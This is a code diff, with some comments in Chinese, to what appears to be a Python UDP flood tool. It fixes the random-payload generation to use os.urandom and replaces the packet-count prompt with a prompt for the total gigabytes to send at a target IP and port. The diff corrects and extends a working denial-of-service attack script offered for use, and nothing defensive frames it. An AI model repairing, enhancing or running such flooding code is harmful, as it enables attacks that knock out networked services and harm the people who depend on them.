@@ -14,7 +14,8 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-data = random.urandom(1490)
+PACKET_SIZE = 1490
+data = os.urandom(PACKET_SIZE)   # 修正为 os.urandom
 #############
 
 os.system("clear")
@@ -46,7 +47,12 @@ print("")
 
 ip = input("IP Target : ")
 port = int(input("Port       : "))
-max_packets = int(input("Max Packets : "))
+
+# ---------- 改为输入总流量（GB）----------
+gb = float(input("Total data to send (GB) : "))
+total_bytes = gb * 1024 * 1024 * 1024
+max_packets = int(total_bytes // PACKET_SIZE)   # 根据包大小计算总包数
+print(f"[*] Will send {max_packets} packets ({gb} GB).")
 
 # ---------- Target reachability check ----------
 def check_target(ip, port):
